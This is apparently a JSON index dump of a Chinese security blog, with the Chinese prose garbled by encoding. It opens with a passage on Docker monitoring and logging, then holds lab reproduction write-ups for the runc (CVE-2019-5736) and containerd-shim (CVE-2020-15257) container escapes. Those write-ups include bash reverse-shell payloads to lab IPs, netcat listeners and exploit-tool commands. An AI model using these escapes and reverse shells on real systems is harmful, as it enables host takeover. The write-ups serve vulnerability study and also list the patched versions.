pointäº†,å¯åŠ¨httpdå®¹å™¨å¹¶ä½¿ç”¨data-packed volume containerã€‚å’Œvolume containerå…¶å®ä¸€æ ·ã€‚\ndocker run --name web2 -d -p 80:80 --volumes-from vc_data httpd\nå®¹å™¨ç›‘æ§\nç›‘æ§å­å‘½ä»¤ï¼špsã€topå’Œstatsï¼Œç„¶åæ˜¯å‡ ä¸ªåŠŸèƒ½æ›´å¼ºçš„å¼€æºç›‘æ§å·¥å…·sysdigã€Weave Scopeã€cAdvisorå’ŒPrometheus\n//ç›‘æ§å­å‘½ä»¤docker container ps docker container top å®¹å™¨ID  //æŸä¸ªå®¹å™¨ä¸­è¿è¡Œäº†å“ªäº›è¿›ç¨‹docker container stats //ç”¨äºæ˜¾ç¤ºæ¯ä¸ªå®¹å™¨å„ç§èµ„æºçš„ä½¿ç”¨æƒ…å†µ//sysdigdocker container run -it --rm --name=sysdig --privileged=true \\ --volume=/var/run/docker.sock:/host/var/run/docker.sock \\ --volume=/dev:/host/dev \\ --volume=/proc:/host/proc:ro \\ --volume=/boot:/host/boot:ro \\ --volume=/lib/modules:/host/lib/modules:ro\\ --volume=/usr:/host/usr:ro \\ sysdig/sysdig//Weave Scopecurl -L git.io/scope -o /usr/local/bin/scope chmod a+x /usr/local/bin/scope scope launch//cAdvisordocker run \\ --volume=/:/rootfs:ro \\ --volume=/var/run:/var/run:rw \\--volume=/sys:/sys:ro \\ --volume=/var/lib/docker/:/var/lib/docker:ro \\ --publish=8080:8080 \\ --detach=true \\ --name=cadvisor \\google/cadvisor:latest\nPrometheusæä¾›äº†ç›‘æ§æ•°æ®æœé›†ã€å­˜å‚¨ã€å¤„ç†ã€å¯è§†åŒ–å’Œå‘Šè­¦ä¸€å¥—å®Œæ•´çš„è§£å†³æ–¹æ¡ˆã€‚\n\nPrometheus Serverï¼šè´Ÿè´£ä»Exporteræ‹‰å–å’Œå­˜å‚¨ç›‘æ§æ•°æ®ï¼Œå¹¶æä¾›ä¸€å¥—çµæ´»çš„æŸ¥è¯¢è¯­è¨€ï¼ˆPromQLï¼‰ä¾›ç”¨æˆ·ä½¿ç”¨ã€‚\nExporterï¼šè´Ÿè´£æ”¶é›†ç›®æ ‡å¯¹è±¡ï¼ˆhostã€containerç­‰ï¼‰çš„æ€§èƒ½æ•°æ®ï¼Œå¹¶é€šè¿‡HTTPæ¥å£ä¾›Prometheus Serverè·å–ã€‚\nå¯è§†åŒ–ç»„ä»¶ï¼šGrafanaèƒ½å¤Ÿä¸Prometheusæ— ç¼é›†æˆï¼Œæä¾›å®Œç¾çš„æ•°æ®å±•ç¤ºèƒ½åŠ›ã€‚\nAlertmanagerï¼šç”¨æˆ·å¯ä»¥å®šä¹‰åŸºäºç›‘æ§æ•°æ®çš„å‘Šè­¦è§„åˆ™ï¼Œè§„åˆ™ä¼šè§¦å‘å‘Šè­¦ã€‚ä¸€æ—¦Alertmanageræ”¶åˆ°å‘Šè­¦ï¼Œä¼šé€šè¿‡é¢„å®šä¹‰çš„æ–¹å¼å‘å‡ºå‘Šè­¦é€šçŸ¥ã€‚æ”¯æŒçš„æ–¹å¼åŒ…æ‹¬Emailã€PagerDutyã€Webhookç­‰ã€‚\n\nâ€‹\næ—¥å¿—ç®¡ç†\nDocker logs\ndocker attach å®¹å™¨ID  //åªèƒ½è®°å½•attachæ‰§è¡Œåçš„æ—¥å¿— æŒ‰Ctrl+pé”®ï¼Œç„¶åå†æŒ‰Ctrl+qé”®æ‰èƒ½é€€å‡ºdocker logs -f å®¹å™¨ID\nELK\nELKæ˜¯ä¸‰ä¸ªè½¯ä»¶çš„åˆç§°ï¼šElasticsearchã€Logstashã€Kibanaã€‚ Logstash-&gt;Elasticsearch-&gt;Kibana\n\nElasticsearchï¼šä¸€ä¸ªè¿‘ä¹å®æ—¶æŸ¥è¯¢çš„å…¨æ–‡æœç´¢å¼•æ“ã€‚Elasticsearchçš„è®¾è®¡ç›®æ ‡å°±æ˜¯è¦èƒ½å¤Ÿå¤„ç†å’Œæœç´¢å·¨é‡çš„æ—¥å¿—æ•°æ®ã€‚\nLogstashï¼šè¯»å–åŸå§‹æ—¥å¿—ï¼Œå¹¶å¯¹å…¶è¿›è¡Œåˆ†æå’Œè¿‡æ»¤ï¼Œç„¶åå°†å…¶è½¬å‘ç»™å…¶ä»–ç»„ä»¶ï¼ˆæ¯”å¦‚Elasticsearchï¼‰è¿›è¡Œç´¢å¼•æˆ–å­˜å‚¨ã€‚Logstashæ”¯æŒä¸°å¯Œçš„Inputå’ŒOutputç±»å‹ï¼Œèƒ½å¤Ÿå¤„ç†å„ç§åº”ç”¨çš„æ—¥å¿—ã€‚\nKibanaï¼šä¸€ä¸ªåŸºäºJavaScriptçš„Webå›¾å½¢ç•Œé¢ç¨‹åºï¼Œä¸“é—¨ç”¨äºå¯è§†åŒ–Elasticsearchçš„æ•°æ®ã€‚Kibanaèƒ½å¤ŸæŸ¥è¯¢Elasticsearchå¹¶é€šè¿‡ä¸°å¯Œçš„å›¾è¡¨å±•ç¤ºç»“æœã€‚ç”¨æˆ·å¯ä»¥åˆ›å»ºDashboardæ¥ç›‘æ§ç³»ç»Ÿçš„æ—¥å¿—ã€‚\n\ndocker run -p 5601:5601-p 9200:9200-p 5044:5044-it --name elk sebp/elk- 5601:Kibana webæ¥å£- 9200:Elasticsearch JSONæ¥å£- 5044:Logstashæ—¥å¿—æ¥æ”¶æ¥å£\nâ€\n","categories":["äº‘å®‰å…¨"]},{"title":"CVE-2019-5736(runcé€ƒé€¸)","url":"/2025/08/21/CVE-2019-5736-runc%E9%80%83%E9%80%B8/","content":"å½±å“ç‰ˆæœ¬\n\nrunc 1.0.0-rc6 åŠæ›´æ—©ç‰ˆæœ¬\nDocker 18.09.2 ä¹‹å‰çš„ç‰ˆæœ¬\nKubernetesã€LXCã€Apache Mesos ç­‰ä¾èµ– runc çš„å®¹å™¨å¹³å°\n\næ¼æ´åŸç†\nCVE-2019-5736 çš„æ ¸å¿ƒåŸç†æ˜¯runc è¿›ç¨‹åœ¨å¯åŠ¨å®¹å™¨æ—¶æœªæ­£ç¡®éš”ç¦»è‡ªèº«æ–‡ä»¶æè¿°ç¬¦ï¼Œå¯¼è‡´å®¹å™¨å†…æ¶æ„è¿›ç¨‹å¯è¦†ç›–å®¿ä¸»æœºçš„ runc äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæœ€ç»ˆå®ç°å®¹å™¨é€ƒé€¸å¹¶è·å–å®¿ä¸»æœº root æƒé™ã€‚\nåˆ©ç”¨æ–¹å¼ï¼š\n\næ–‡ä»¶æè¿°ç¬¦æ³„éœ²ï¼š runc å¯åŠ¨å®¹å™¨æ—¶ï¼Œä¼šé€šè¿‡/proc/self/exeï¼ˆæŒ‡å‘è‡ªèº«äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰åˆ›å»ºè¿›ç¨‹ï¼Œä¸”æœªå…³é—­è¯¥æ–‡ä»¶æè¿°ç¬¦ï¼ˆFDï¼‰ã€‚å®¹å™¨å†…çš„è¿›ç¨‹å¯é€šè¿‡/proc/self/fd/è®¿é—®æ­¤æ³„éœ²çš„ FDï¼Œè¯¥ FD ç›´æ¥æŒ‡å‘å®¿ä¸»æœºä¸Šçš„ runc äºŒè¿›åˆ¶æ–‡ä»¶ã€‚\nè¦†ç›–å®¿ä¸»æœº runcï¼š å®¹å™¨å†…çš„æ¶æ„è¿›ç¨‹é€šè¿‡è¯¥ FD ä»¥å¯å†™æ–¹å¼æ‰“å¼€å®¿ä¸»æœº runc æ–‡ä»¶ï¼Œå¾ªç¯å†™å…¥æ¶æ„ä»£ç ã€‚\nè§¦å‘æ¡ä»¶ï¼šæ”»å‡»è€…éœ€æ§åˆ¶å®¹å™¨ï¼Œç”±äº runc é€šå¸¸ä»¥ root æƒé™æ‰§è¡Œï¼Œè¦†ç›–runc åï¼Œå®¿ä¸»æœºåç»­ä»»ä½•è°ƒç”¨ runc çš„æ“ä½œï¼ˆå¦‚docker runï¼‰éƒ½ä¼šè§¦å‘æ¶æ„ä»£ç ï¼Œå¯¼è‡´æ”»å‡»è€…è·å¾—å®¿ä¸»æœº root æƒé™ã€‚\n\næ³¨ï¼šæ–‡ä»¶æè¿°ç¬¦ç”¨äºæ ‡è¯†è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶ã€è®¾å¤‡ã€ç®¡é“ç­‰èµ„æºã€‚runc ä½œä¸ºå®¹å™¨è¿è¡Œæ—¶ï¼Œåœ¨å¯åŠ¨å’Œç®¡ç†å®¹å™¨çš„è¿‡ç¨‹ä¸­ä¼šæ¶‰åŠå¤§é‡æ–‡ä»¶æè¿°ç¬¦çš„æ“ä½œï¼Œè¿™äº› FD ç”¨äºä¸å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿã€è®¾å¤‡ã€ç®¡é“ç­‰è¿›è¡Œäº¤äº’ã€‚\nç¯å¢ƒæ­å»º\nå®‰è£…æ¼æ´ç‰ˆæœ¬\n#centos7yum list docker-ce --showduplicates | sort -ryum install docker-ce-18.06.1.ce-3.el7 -y[root@localhost ~]# systemctl start docker.service [root@localhost ~]#  docker -vDocker version 18.06.1-ce, build e68fc7a[root@localhost ~]# docker-runc -vrunc version 1.0.0-rc5+devcommit: 69663f0bd4b60df09991c08812a60108003fa340spec: 1.0.0\né…ç½®è¿›é•œåƒæº\n# åˆ›å»ºDockeré…ç½®ç›®å½•sudo mkdir -p /etc/docker# é…ç½®åŠ é€Ÿå™¨ï¼ˆä»¥é˜¿é‡Œäº‘ä¸ºä¾‹ï¼Œå¯æ›¿æ¢ä¸ºå…¶ä»–æºï¼‰sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;&#123;  &quot;registry-mirrors&quot;: [    &quot;https://docker.xuanyuan.me&quot;  ]&#125;EOF# é‡å¯DockeræœåŠ¡sudo systemctl daemon-reloadsudo systemctl restart docker\nåœ¨å—å®³è€…æœºå™¨ä¸Šå¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼Œæ­å»ºæ”»å‡»ç¯å¢ƒ\n[root@localhost ~]# docker pull nginx[root@localhost ~]# docker run --name nginx-test -p 8080:80 -d nginx[root@localhost ~]# docker ps -a\n\næ¼æ´å¤ç°\næ–¹æ³•ä¸€ docker runcè§¦å‘\nPOC\næ­¤æ¼æ´å°†è¦†ç›– runc çš„å®ç°ï¼Œè¿™å°†å¯¼è‡´æ‚¨çš„ç³»ç»Ÿæ— æ³•å†è¿è¡Œ Docker å®¹å™¨ã€‚è¯·å¤‡ä»½ /usr/bin/docker-runc æˆ– /usr/bin/runc\ncp /usr/bin/docker-runc /usr/bin/docker-runc.bak\n#ä¿®æ”¹mian.govar payload = &quot;#!/bin/bash \\n bash -i &gt;&amp; /dev/tcp/192.168.247.135/8887 0&gt;&amp;1&quot;#goç¯å¢ƒwget https://dl.google.com/go/go1.14.linux-amd64.tar.gztar -zxf go1.14.linux-amd64.tar.gz -C /usr/localvi /etc/profile\t#golang env config\texport GO111MODULE=on\texport GOROOT=/usr/local/go \texport GOPATH=/home/gopath\texport PATH=$PATH:$GOROOT/bin:$GOPATH/binsource /etc/profile # ç¼–è¯‘å½“å‰ç›®å½•çš„ Go ç¨‹åºï¼Œè¾“å‡ºä¸º expCGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o exp main.go\næ”»å‡»è€…éœ€è¦åœ¨å®¹å™¨å†…æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶å¯åŠ¨ä¸€ä¸ªç”¨äºç›‘å¬çš„æ¶æ„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚å½“æœ‰äººï¼ˆæ”»å‡»è€…æˆ–å—å®³è€…ï¼‰åˆ©ç”¨è¯¥docker execæ¼æ´è¿›å…¥å®¹å™¨æ—¶ï¼Œå°±ä¼šè§¦å‘æ¼æ´ï¼Œå…è®¸ä»¥ root èº«ä»½æ‰§è¡Œä»£ç ã€‚\ndocker cp /root/Desktop/CVE-2019-5736-PoC-master/exp nginx-test:/homedocker exec -it nginx-test /bin/shcd home &amp;&amp; chmod +x exp &amp;&amp; ./exp\n\nç›´æ¥ä½¿ç”¨hostç›‘å¬8887\n\né‡æ–°å¼€å¯å¦ç»ˆç«¯è¿›å…¥å®¹å™¨ /bin/shâ€‹\ndocker exec -it nginx-test /bin/sh\n\n\nâ€\næ–¹æ³•äºŒ æ¶æ„ Docker é•œåƒ\nPOC\nåˆ›å»ºä¸€ä¸ªæ¶æ„ Docker é•œåƒã€‚å½“è¯¥é•œåƒè¿è¡Œæ—¶ï¼Œæ¼æ´åˆ©ç”¨ä»£ç å°†ä¼šè§¦å‘ã€‚æ— éœ€åœ¨å®¹å™¨ä¸­æ‰§è¡Œ exec æ“ä½œã€‚\nä¿®æ”¹ stage2.câ€‹\nconst char *poc = &quot;#!/bin/bash\\n/bin/bash -i &gt;&amp; /dev/tcp/192.168.247.129/6666 0&gt;&amp;1  &amp;\\n&quot;;\nâ€cd cve-2019-5736-poc-isodocker build -t cve .docker run -d cve /bin/bash -c &quot;tail -f /dev/null&quot;cp /usr/bin/docker-runc /usr/bin/docker-runc.bakdocker exec -it docker-id /bin/bashcd /root &amp;&amp; ./run.sh &amp;&amp; exitdocker exec -it docker-id /bin/bash\nâ€\næ–¹æ³•ä¸‰ CDK\nCDK æ—§ç‰ˆæœ¬çš„\nsudo ./cdk run runc-pwn  //è‡ªåŠ¨æ£€æµ‹æœ¬åœ° runc ç‰ˆæœ¬åŠæ¼æ´æƒ…å†µsudo ./cdk run runc-pwn --container &lt;å®¹å™¨ID/åç§°&gt;\nä¿®å¤æ–¹å¼\nå‡çº§ runc è‡³ 1.0.0-rc7 + æˆ– Docker è‡³ 18.09.2+\n","categories":["äº‘å®‰å…¨"]},{"title":"CVE-2020-15257(containerdé€ƒé€¸)","url":"/2025/08/22/CVE-2020-15257-containerd%E9%80%83%E9%80%B8/","content":"å½±å“ç‰ˆæœ¬\ncontainerd &lt;1.3.9 æˆ– &lt;1.4.3\næ¼æ´åŸç†\ncontainerd æ˜¯ Docker ç­‰å®¹å™¨å¹³å°çš„æ ¸å¿ƒè¿è¡Œæ—¶ç»„ä»¶ï¼Œå…¶æ¶æ„ä¸­åŒ…å«containerd-shimè¿›ç¨‹ï¼Œè´Ÿè´£ä¸­é—´å±‚ç®¡ç†ï¼ˆå¦‚è¿›ç¨‹ç›‘æ§ã€ä¿¡å·è½¬å‘ã€IO é‡å®šå‘ç­‰ï¼‰ï¼Œéš”ç¦» containerd ä¸»è¿›ç¨‹ä¸å®¹å™¨è¿›ç¨‹ã€‚containerd&lt;-&gt;containerd-shim&lt;-&gt;runcâ€‹\n\næ”»å‡»è€…å¯é€šè¿‡æ¶æ„å®¹å™¨æ„é€ ç‰¹æ®Šè¿›ç¨‹ï¼Œåˆ©ç”¨ containerd-shim è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆFDï¼‰ç®¡ç†ç¼ºé™·ï¼Œè·å–å®¿ä¸»æœºçš„æ•æ„Ÿæ–‡ä»¶æè¿°ç¬¦ï¼Œæœ€ç»ˆå®ç°å®¹å™¨é€ƒé€¸å¹¶è®¿é—®å®¿ä¸»æœºèµ„æºã€‚\nshim åœ¨å¤„ç†å­è¿›ç¨‹é€€å‡ºä¿¡å·ï¼ˆSIGCHLDï¼‰æ—¶ï¼Œæœªæ­£ç¡®éªŒè¯è¿›ç¨‹ PID çš„å½’å±ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä¼ªé€  PID æ¬ºéª— shimï¼Œè·å–æœ¬åº”å±äºå®¿ä¸»æœºçš„æ–‡ä»¶æè¿°ç¬¦ã€‚\n\nshim çš„è¿›ç¨‹ç®¡ç†é€»è¾‘ï¼š å½“å®¹å™¨å†…è¿›ç¨‹é€€å‡ºæ—¶ï¼Œå†…æ ¸ä¼šå‘é€ SIGCHLD ä¿¡å·ç»™ shimï¼Œshim é€šè¿‡waitpid()ç³»ç»Ÿè°ƒç”¨å›æ”¶è¿›ç¨‹èµ„æºã€‚æ­¤æ—¶ï¼Œshim ä¼šå°†è¯¥è¿›ç¨‹å…³è”çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆå¦‚æ ‡å‡†è¾“å…¥ / è¾“å‡ºçš„ FDï¼‰å…³é—­ã€‚\nPID éªŒè¯ç¼ºé™·ï¼š æ­£å¸¸æƒ…å†µä¸‹ï¼Œshim åº”åªå¤„ç†å®¹å™¨å†…çš„è¿›ç¨‹ï¼ˆå³å±äºå®¹å™¨ PID å‘½åç©ºé—´çš„è¿›ç¨‹ï¼‰ã€‚ä½†æ¼æ´ç‰ˆæœ¬ä¸­ï¼Œshim æœªéªŒè¯waitpid()è¿”å›çš„ PID æ˜¯å¦å±äºå®¹å™¨å†…çš„è¿›ç¨‹ï¼Œè€Œæ˜¯ç›´æ¥å¤„ç†æ‰€æœ‰ SIGCHLD ä¿¡å·è§¦å‘çš„è¿›ç¨‹å›æ”¶ï¼Œå¯¼è‡´äº†æ¼æ´çš„äº§ç”Ÿã€‚\n\næ”»å‡»è€…åœ¨å®¹å™¨å†…åˆ›å»ºæ¶æ„è¿›ç¨‹ï¼ŒåŒæ—¶åœ¨å®¿ä¸»æœºä¾§æ„é€ åŒå PID çš„è¿›ç¨‹ï¼ˆé€šè¿‡å‘½åç©ºé—´é€ƒé€¸æˆ– PID å¤ç”¨ï¼‰ã€‚å½“å®¿ä¸»æœºä¾§è¿›ç¨‹é€€å‡ºæ—¶ï¼Œshim ä¼šé”™è¯¯åœ°å°†å…¶ FD ä¼ é€’ç»™å®¹å™¨å†…çš„æ¶æ„è¿›ç¨‹ï¼Œå¯¼è‡´å®¹å™¨å†…è¿›ç¨‹å¯è®¿é—®å®¿ä¸»æœºçš„ FDï¼ˆå¦‚å®¿ä¸»æœºçš„æ–‡ä»¶ã€è®¾å¤‡ç­‰ï¼‰ã€‚\nç¯å¢ƒæ­å»º\n#å¸è½½sudo yum remove -y docker \\                  docker-client \\                  docker-client-latest \\                  docker-common \\                  docker-latest \\                  docker-latest-logrotate \\                  docker-logrotate \\                  docker-engine \\                  containerd.io\n# å®‰è£… containerd 1.3.7ï¼ˆæ¼æ´ç‰ˆæœ¬ï¼‰sudo yum install -y containerd.io-1.3.7-3.1.el7# å®‰è£… Docker 19.03.8ï¼ˆä¸ containerd 1.3.7 å…¼å®¹ï¼‰sudo yum install -y docker-ce-19.03.8 docker-ce-cli-19.03.8containerd --versiondocker --versionsystemctl start docker.service systemctl enable docker.service\n\ndocker run --name  nginx-test --net=host -p 8080:80 -d nginxdocker exec -it  nginx-test /bin/bashcat /proc/net/unix|grep -a &quot;containerd-shim&quot;\n\nroot å®¹å™¨ï¼š è·å–å®¿ä¸»æœº FD åï¼Œå¯ç›´æ¥è¯»å†™å®¿ä¸»æœºçš„æ•æ„Ÿæ–‡ä»¶ï¼ˆå¦‚ä¿®æ”¹/etc/sudoersï¼‰æˆ–æŒ‚è½½è®¾å¤‡ï¼Œå®ç°å®Œæ•´é€ƒé€¸ã€‚\nâ€“net=host ï¼š å¯åŠ¨ä¼šæš´éœ²containerd-shim ç›‘å¬çš„ Unix åŸŸå¥—æ¥å­—ï¼Œæ”»å‡»è€…è‹¥èƒ½è®¿é—® containerd-shim çš„ Unix åŸŸå¥—æ¥å­—ï¼Œå¯èƒ½ï¼š\n\nå‘é€ä¼ªé€ çš„è¿›ç¨‹é€€å‡ºä¿¡å·ï¼Œè¾…åŠ©è§¦å‘ shim çš„wait4()é€»è¾‘ï¼›\né€šè¿‡å¥—æ¥å­—è·å–å®¹å™¨è¿›ç¨‹ä¸ shim çš„é€šä¿¡ä¿¡æ¯ï¼Œæ›´å®¹æ˜“çŒœæµ‹æˆ–ä¼ªé€  PIDï¼›\nç›´æ¥ä¸ shim äº¤äº’ï¼Œæ“çºµå…¶å¯¹ FD çš„ç®¡ç†é€»è¾‘ï¼ŒåŠ é€Ÿæ–‡ä»¶æè¿°ç¬¦æ³„éœ²ã€‚\n\næ¼æ´å¤ç°\ncdk ç”¨æ—§ç‰ˆæœ¬çš„\næ­¤æ¼æ´åˆ©ç”¨ä¼šå¯¼è‡´ Docker/containerd å‡ºç°ä¸€äº›é—®é¢˜ã€‚å…¶ä¸­ä¼šæ®‹ç•™ä¸€ä¸ªæ‚¬æŒ‚çš„ containerd-shim å’Œ Docker å®¹å™¨ï¼Œéœ€è¦docker rm --forceåˆ†åˆ«å°†å…¶ç»ˆæ­¢å’Œ d ä»¥è¿›è¡Œæ¸…ç†ã€‚\n#æŠŠå·¥å…·æ”¾åˆ°å®¹å™¨é‡Œdocker cp cdk nginx-test:/tmp#kaliç›‘å¬nc -lvvp 6666\n\ndocker exec -it  nginx-test /bin/bashcd /tmp ./cdk run shim-pwn 192.168.247.129 6666\n\n\nä¿®å¤æ–¹å¼\nå‡çº§ containerd è‡³ 1.3.10+ æˆ– 1.4.4+\nâ€\n","categories":["äº‘å®‰å…¨"]},{"title":"link","url":"/link/index.html","content":"æ¬¢è¿äº¤æ¢å‹é“¾~ï¼Œè”ç³»é‚®ç®±ï¼škaelth@126.com\n\nå…ˆçŸ¥ç¤¾åŒº\n\n"},{"title":"categories","url":"/categories/index.html","content":"\nç½‘ç»œå®‰å…¨\näº‘å®‰å…¨\nSDLå»ºè®¾\nç”Ÿæ´»è®°å½•\né˜¶æ®µæ€»ç»“\n\n"}]